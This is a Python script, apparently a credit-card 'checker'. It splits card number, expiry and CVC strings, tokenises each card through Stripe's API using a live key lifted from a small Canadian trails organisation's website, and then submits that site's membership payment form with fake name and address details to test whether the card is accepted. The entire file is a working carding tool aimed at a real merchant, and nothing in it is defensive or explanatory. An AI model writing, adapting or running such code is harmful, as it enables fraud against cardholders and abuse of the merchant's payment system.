import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
			'authority': 'api.stripe.com',
			'accept': 'application/json',
			'accept-language': 'en-US,en;q=0.9',
			'content-type': 'application/x-www-form-urlencoded',
			'origin': 'https://js.stripe.com',
			'referer': 'https://js.stripe.com/',
			'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-site',
			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=c2f18cda-a0b8-4c7f-8a0c-81019f48a723ea0d0d&muid=f2b4f624-b27b-4a94-a750-ae3a3e4788a83c75da&sid=6b83e9b4-5ddd-4a14-809f-033ffc730140ab388a&pasted_fields=number&payment_user_agent=stripe.js%2F69c9d75b7b%3B+stripe-js-v3%2F69c9d75b7b%3B+card-element&referrer=https%3A%2F%2Fwww.kaientrails.ca&time_on_page=102794&key=pk_live_51MjvmRFL2ntPTriuAuQAvLdiCqjTQTWCKW1etoFlCsGlQK5DISEi5JWL2xNFCidaMUqhe7oiSQi0rPgjyB8zen1S008nsNqeLa'
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']

	cookies = {
			'__stripe_mid': 'stripe_mid=bc1c1a60-d0ea-4a4d-92ba-10c51782763484a40f',
			'__stripe_sid': 'stripe_sid=828442a6-31b9-4196-8f26-6afaaf7844f2debb6c',
	}

	headers = {
			'authority': 'www.kaientrails.ca',
			'accept': '*/*',
			'accept-language': 'en-US,en;q=0.9',
			'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			# 'cookie': '__stripe_mid=cd04496a-fc78-49f6-99fc-6310e3e55e6221dc47; __stripe_sid=b3b7888f-21a6-4ff7-a3cf-b0242d6fcf37cce97e',
			'origin': 'https://www.kaientrails.ca',
			'referer': 'https://www.kaientrails.ca/membership-information/',
			'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-origin',
			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
			'x-requested-with': 'XMLHttpRequest',
	}

	params = {
			't': '1730399030172',
	}

	data = {
			'data': '__fluent_form_embded_post_id=128&_fluentform_3_fluentformnonce=e35df74ca4&_wp_http_referer=%2Fmembership-information%2F&names%5Bfirst_name%5D=deno&names%5Blast_name%5D=ibs&address_1%5Baddress_line_1%5D=60672%20Rolfson%20Plaza&address_1%5Baddress_line_2%5D=&address_1%5Bcity%5D=Beattymouth&address_1%5Bstate%5D=British%20Columbia&address_1%5Bzip%5D=68012&address_1%5Bcountry%5D=CA&phone=%2B66635323967&email=deniotitok179%40gmail.com&payment_input=2024%20Adult%20Membership&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
    'action': 'fluentform_submit',
    'form_id': '3',
	}
	
	r2 = requests.post(
			'https://www.kaientrails.ca/wp-admin/admin-ajax.php',
			params=params,
			cookies=cookies,
			headers=headers,
			data=data,
	)
	return (r2.json())